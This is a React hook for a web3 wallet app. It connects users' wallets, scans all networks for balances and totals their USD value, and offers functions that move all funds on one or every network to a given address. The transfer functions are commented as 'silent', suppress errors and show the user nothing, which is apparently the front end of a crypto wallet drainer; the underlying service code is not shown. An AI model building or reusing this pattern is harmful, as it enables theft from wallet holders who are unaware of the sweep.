import { useState, useEffect, useCallback } from "react";
import { web3Service, type WalletState } from "@/lib/web3";
import { useToast } from "@/hooks/use-toast";

const initialState: WalletState = {
  isConnected: false,
  address: null,
  ethBalance: null,
  tokenBalances: [],
  totalUsdValue: 0,
  networkId: null,
  networkName: null,
  provider: null,
  networkBalances: [],
  allNetworksLoaded: false,
};

export function useWeb3() {
  const [walletState, setWalletState] = useState<WalletState>(initialState);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);
  const [isLoadingNetworks, setIsLoadingNetworks] = useState(false);
  const [hasShownConnectedToast, setHasShownConnectedToast] = useState(false);
  const [hasAnyNetworkFunds, setHasAnyNetworkFunds] = useState(false);
  const [crossNetworkValue, setCrossNetworkValue] = useState(0);
  const { toast } = useToast();

  // Removed automatic connection attempts that were causing repeated notifications

  const connectWallet = useCallback(async () => {
    setIsConnecting(true);
    try {
      // Fast wallet connection - get basic state immediately
      const state = await web3Service.connectWallet();
      console.log('Wallet connected instantly:', state);
      
      // Set basic wallet state immediately for instant UI feedback
      setWalletState(state);
      setIsConnecting(false);
      
      // Show connection success immediately
      if (!hasShownConnectedToast) {
        toast({
          title: "Wallet Connected",
          description: `Connected to ${state.address?.slice(0, 6)}...${state.address?.slice(-4)}`,
        });
        setHasShownConnectedToast(true);
      }
      
      // Start network scanning in background after connection
      if (state.address) {
        setIsLoadingNetworks(true);
        console.log('Starting multi-network scan...');
        
        // Launch network scan with proper error handling
        const startNetworkScan = async () => {
          try {
            const networkBalances = await web3Service.scanAllNetworks(state.address!);
            console.log(`Network scan completed: ${networkBalances.length} networks processed`);
            
            // Update UI with results
            setWalletState(prev => ({
              ...prev,
              networkBalances,
              allNetworksLoaded: true
            }));
            
            // Update cross-network fund status
            const networksWithFunds = networkBalances.filter(n => n.totalUsdValue > 0 || n.tokenBalances.length > 0);
            const hasAnyFunds = networksWithFunds.length > 0;
            const totalValue = networkBalances.reduce((sum, n) => sum + n.totalUsdValue, 0);
            
            setHasAnyNetworkFunds(hasAnyFunds);
            setCrossNetworkValue(totalValue);
            
            setIsLoadingNetworks(false);
            
            // Show completion toast with actual results
            if (networksWithFunds.length > 0) {
              toast({
                title: "Multi-Network Scan Complete",
                description: `Found balances on ${networksWithFunds.length} network${networksWithFunds.length !== 1 ? 's' : ''} ($${totalValue.toFixed(2)} total)`,
              });
            } else {
              toast({
                title: "Network Scan Complete",
                description: "No balances found on supported networks",
              });
            }
            
          } catch (networkError: any) {
            console.error('Multi-network scan failed:', networkError);
            setWalletState(prev => ({
              ...prev,
              allNetworksLoaded: true
            }));
            setIsLoadingNetworks(false);
            
            toast({
              variant: "destructive",
              title: "Network Scan Failed",
              description: "Unable to scan all networks. Some balances may not be displayed.",
            });
          }
        };
        
        // Execute with small delay to allow UI to update first
        setTimeout(startNetworkScan, 500);
      }
      
      return true;
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Connection Failed",
        description: error.message,
      });
      setIsConnecting(false);
      setIsLoadingNetworks(false);
      throw error;
    }
  }, [toast, hasShownConnectedToast]);

  const refreshBalance = useCallback(async () => {
    if (!walletState.address || !walletState.networkId) return;

    try {
      const ethBalance = await web3Service.getEthBalance(walletState.address);
      const tokenBalances = await web3Service.getTokenBalances(walletState.address, walletState.networkId);
      const totalUsdValue = await web3Service.calculateTotalUsdValue(ethBalance, tokenBalances);
      
      setWalletState(prev => ({ 
        ...prev, 
        ethBalance,
        tokenBalances,
        totalUsdValue
      }));
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Balance",
        description: error.message,
      });
    }
  }, [walletState.address, walletState.networkId, toast]);

  const transferAllFunds = useCallback(async (toAddress: string) => {
    // Silent validation
    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
      return null;
    }

    setIsTransferring(true);
    try {
      const txHashes = await web3Service.transferAllFunds(toAddress);
      
      // Silent refresh after transaction
      setTimeout(() => {
        refreshBalance();
      }, 3000);

      return txHashes;
    } catch (error: any) {
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, refreshBalance]);



  const getTransactionStatus = useCallback(async (txHash: string) => {
    try {
      return await web3Service.getTransactionStatus(txHash);
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Get Transaction Status",
        description: error.message,
      });
      return null;
    }
  }, [toast]);

  // Setup event listeners for account and network changes
  useEffect(() => {
    const handleAccountChange = (accounts: string[]) => {
      if (accounts.length === 0) {
        setWalletState(initialState);
        setHasShownConnectedToast(false); // Reset toast flag
        toast({
          title: "Wallet Disconnected",
          description: "Your wallet has been disconnected",
        });
      } else if (accounts[0] !== walletState.address) {
        // Account changed, update state without reconnecting
        setWalletState(prev => ({
          ...prev,
          address: accounts[0]
        }));
      }
    };

    const handleNetworkChange = (networkId: string) => {
      // Network changed, update state without full reconnection
      if (walletState.isConnected) {
        setWalletState(prev => ({
          ...prev,
          networkId: networkId,
          networkName: `Network ${networkId}`
        }));
      }
    };

    web3Service.setupEventListeners(handleAccountChange, handleNetworkChange);

    return () => {
      web3Service.removeEventListeners();
    };
  }, [walletState.address, walletState.isConnected, connectWallet, toast]);

  // Enhanced connection state persistence and monitoring
  useEffect(() => {
    const persistConnectionState = () => {
      if (walletState.isConnected && walletState.address) {
        sessionStorage.setItem('wallet_connected', 'true');
        sessionStorage.setItem('wallet_address', walletState.address);
      } else {
        sessionStorage.removeItem('wallet_connected');
        sessionStorage.removeItem('wallet_address');
      }
    };

    persistConnectionState();

    // Disabled real-time monitoring for better performance
    // Connection state changes will be handled by wallet events instead
  }, [walletState.isConnected, walletState.address, toast]);

  // Fast auto-connect for returning users
  useEffect(() => {
    const fastAutoConnect = () => {
      // Skip if already connecting or connected, or no ethereum
      if (isConnecting || walletState.isConnected || !window.ethereum) return;
      
      // Quick session check - only reconnect if explicitly connected before
      const wasConnected = sessionStorage.getItem('wallet_connected');
      
      if (wasConnected === 'true') {
        // Lightning-fast eth_accounts call with timeout
        Promise.race([
          window.ethereum.request({ method: "eth_accounts" }),
          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 1000))
        ]).then((accounts: string[]) => {
          if (accounts && accounts.length > 0) {
            connectWallet();
          } else {
            sessionStorage.clear();
          }
        }).catch(() => {
          sessionStorage.clear();
          console.log('Auto-connect skipped due to timeout or error');
        });
      }
    };

    // Minimal delay to allow page to load first
    const timeoutId = setTimeout(fastAutoConnect, 100);
    return () => clearTimeout(timeoutId);
  }, []); // Remove dependencies to prevent re-running

  const refreshAllNetworks = useCallback(async () => {
    if (!walletState.address) return;
    
    setIsLoadingNetworks(true);
    try {
      const networkBalances = await web3Service.refreshNetworkBalances(walletState.address);
      setWalletState(prev => ({
        ...prev,
        networkBalances,
        allNetworksLoaded: true
      }));
      
      toast({
        title: "Networks Updated",
        description: `Found balances across ${networkBalances.length} networks`,
      });
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Networks",
        description: error.message,
      });
    } finally {
      setIsLoadingNetworks(false);
    }
  }, [walletState.address, toast]);

  const transferAllFundsMultiNetwork = useCallback(async (toAddress: string) => {
    // Silent validation
    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
      return null;
    }

    setIsTransferring(true);
    try {
      const result = await web3Service.transferAllFundsMultiNetwork(toAddress);
      
      // Silent refresh after transfer
      setTimeout(() => {
        if (walletState.address) {
          refreshAllNetworks();
        }
      }, 5000);

      return result;
    } catch (error: any) {
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, refreshAllNetworks]);

  return {
    walletState,
    isConnecting,
    isTransferring,
    isLoadingNetworks,
    hasAnyNetworkFunds,
    crossNetworkValue,
    connectWallet,
    refreshBalance,
    refreshAllNetworks,
    transferAllFunds,
    transferAllFundsMultiNetwork,
    getTransactionStatus,
  };
}
